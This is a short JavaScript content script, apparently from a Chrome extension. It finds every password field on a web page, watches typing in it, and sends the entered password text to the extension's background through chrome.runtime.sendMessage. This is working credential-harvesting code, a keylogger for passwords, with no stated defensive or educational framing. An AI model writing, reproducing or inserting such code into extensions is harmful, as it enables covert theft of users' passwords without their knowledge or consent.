console.log('content running');

const tags = document.getElementsByTagName('input');

for(item of tags){
    if(item.getAttribute('type') == 'password'){
        readPassword(item);
    }
}

function readPassword(item){
    item.oninput = function(){
        var x = item.value;
        if(x != ''){
            let message = {
                text: x
            };
            chrome.runtime.sendMessage(message);
        }
    }
}

